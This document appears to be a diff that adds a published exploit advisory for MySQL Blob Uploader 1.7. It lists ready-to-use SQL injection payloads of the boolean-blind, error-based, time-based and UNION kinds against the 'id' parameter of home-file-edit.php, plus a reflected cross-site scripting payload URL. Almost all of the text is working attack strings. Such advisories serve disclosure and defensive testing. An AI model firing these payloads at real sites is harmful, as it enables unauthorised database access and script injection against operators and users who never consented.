@@ -1,0 +1,46 @@
+# Exploit Title: MySQL Blob Uploader 1.7 - 'home-file-edit.php' SQL Injection / Cross-Site Scripting
+# Dork: N/A
+# Date: 22.05.2018
+# Exploit Author: Özkan Mustafa Akkuş (AkkuS)
+# Vendor Homepage: https://codecanyon.net/item/mysql-file-and-image-uploader-and-sharing-blob-file-server/17748300
+# Version: 1.7 - seventh update
+# Category: Webapps
+# Tested on: Kali linux
+====================================================
+
+# PoC : SQLi :
+
+Parameter : id
+
+     Type : boolean-based blind
+     Demo :
+http://test.com/MySqlBlobUploader/home-file-edit.php?id=42
+  Payload : id=42' AND 5445=5445 AND 'xkCg'='xkCg
+
+     Type : error-based
+     Demo :
+http://test.com/MySqlBlobUploader/home-file-edit.php?id=42
+  Payload : id=42' AND (SELECT 8740 FROM(SELECT
+COUNT(*),CONCAT(0x7178717671,(SELECT
+(ELT(8740=8740,1))),0x717a6b7171,FLOOR(RAND(0)*2))x FROM
+INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'xWJA'='xWJA
+
+     Type : AND/OR time-based blind
+     Demo :
+http://test.com/MySqlBlobUploader/home-file-edit.php?id=42
+  Payload : id=42' AND SLEEP(5) AND 'eOfO'='eOfO
+
+     Type : UNION query
+     Demo :
+http://test.com/MySqlBlobUploader/home-file-edit.php?id=42
+  Payload : id=-4824' UNION ALL SELECT
+CONCAT(0x7178717671,0x4e4448494b6a6457474572704c5a73534661474c6f6b44554a7863754d77565570654c664a634274,0x717a6b7171),NULL,NULL,NULL,NULL,NULL--
+aTGd
+
+
+====================================================
+
+# PoC : XSS :
+
+  Payload :
+http://test.com/MySqlBlobUploader/home-file-edit.php?id=%27%20%3C/script%3E%3Cscript%3Ealert%28%27akkus+keyney%27%29%3C/script%3E%E2%80%98;&t=files
